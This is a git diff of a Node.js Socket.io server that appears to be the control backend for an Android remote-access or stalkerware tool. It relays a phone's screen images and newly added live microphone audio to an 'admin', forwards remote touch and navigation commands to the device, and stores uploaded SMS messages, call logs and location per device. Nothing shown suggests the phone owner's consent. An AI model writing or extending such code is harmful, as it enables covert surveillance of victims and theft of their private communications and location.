@@ -4,20 +4,20 @@ const path = require('path');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const cloudinary = require('cloudinary').v2;
-const http = require('http'); // ✅ NEW: HTTP Server
-const { Server } = require("socket.io"); // ✅ NEW: Socket.io for Realtime
+const http = require('http'); 
+const { Server } = require("socket.io"); 
 
 const app = express();
-const server = http.createServer(app); // ✅ Wrap Express in HTTP Server
+const server = http.createServer(app); 
 const PORT = process.env.PORT || 3000;
 
-// ✅ SOCKET.IO SETUP (Live Control Ke Liye)
+// ✅ SOCKET.IO SETUP (Heavy Data Allowed)
 const io = new Server(server, {
     cors: {
-        origin: "*", // Kisi bhi website se allow karega
+        origin: "*", 
         methods: ["GET", "POST"]
     },
-    maxHttpBufferSize: 1e8 // 100MB buffer for heavy screen data
+    maxHttpBufferSize: 1e8 // 100MB buffer for Screen & Audio
 });
 
 // --- 1. CLOUDINARY CONFIG ---
@@ -39,31 +39,45 @@ app.use(express.static(__dirname));
 // Live Status (RAM Storage)
 let devicesStatus = {}; 
 
-// --- 3. SOCKET.IO LOGIC (🔥 LIVE SCREEN & CONTROL) ---
+// ==================================================
+// 🔥 3. SOCKET.IO LOGIC (MAIN CONTROL CENTER)
+// ==================================================
 io.on('connection', (socket) => {
     console.log('🔌 New Connection:', socket.id);
 
-    // 1. Join Room (Device aur Admin dono same ID se join karenge)
+    // 1. Join Room (Device & Admin same ID se connect honge)
     socket.on('join', (roomID) => {
         socket.join(roomID);
         console.log(`🔗 Socket Joined Room: ${roomID}`);
     });
 
     // 2. SCREEN SHARE (Device -> Admin)
-    // Phone screen ki images bhejega, hum admin ko forward karenge
     socket.on('screen-data', (data) => {
         const { room, image } = data;
-        // Sirf us room me bhejo (Admin ko milega)
+        // Sirf admin ko bhejo
         socket.to(room).emit('screen-data', image);
     });
 
-    // 3. REMOTE CONTROL (Admin -> Device)
-    // Admin click/swipe karega, hum phone ko forward karenge
+    // 3. 🎤 AUDIO STREAM (Device -> Admin) [NEW & IMPORTANT]
+    // Ye code zaroori hai taaki mic ki awaaz admin tak pahuche
+    socket.on('audio-stream', (room, data) => {
+        socket.to(room).emit('audio-stream', data);
+    });
+
+    // 4. 🎮 REMOTE CONTROL (Admin -> Device)
+    // Supports: Click, Swipe, Back, Home, Recent
     socket.on('control-event', (data) => {
         const { room, action, x, y, key } = data; 
-        // Action: 'click', 'swipe', 'home', 'back'
+        
+        // Log taaki pata chale button dab raha hai
+        if(action === 'global-action') {
+            console.log(`🔘 Navigation Button: ${key} on device ${room}`);
+        } else {
+            console.log(`👆 Touch/Swipe: ${action} on device ${room}`);
+        }
+
+        // Phone ko command bhejo
         socket.to(room).emit('control-event', { action, x, y, key });
-        console.log(`🎮 Control Event to ${room}: ${action}`);
     });
 
     socket.on('disconnect', () => {
@@ -73,7 +87,7 @@ io.on('connection', (socket) => {
 
 // --- 4. ROOT ROUTE ---
 app.get('/', (req, res) => {
-    res.send('✅ Server is Running (Socket.io Active for Live Control)!');
+    res.send('✅ Server is Running (Socket.io Active for Screen, Audio & Controls)!');
 });
 
 // ==================================================
@@ -171,7 +185,7 @@ app.post('/api/send-command', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE
+//  DATA STORAGE (SMS, Call Logs, Location)
 // ==================================================
 
 app.post('/api/upload_data', (req, res) => {
@@ -226,5 +240,5 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     else res.json([]);
 });
 
-// ✅ IMPORTANT: "server.listen" instead of "app.listen" for Socket.io
-server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} WITH SOCKET.IO`));
+// ✅ SERVER START
+server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} WITH SOCKET.IO (Audio + Screen + Controls)`));
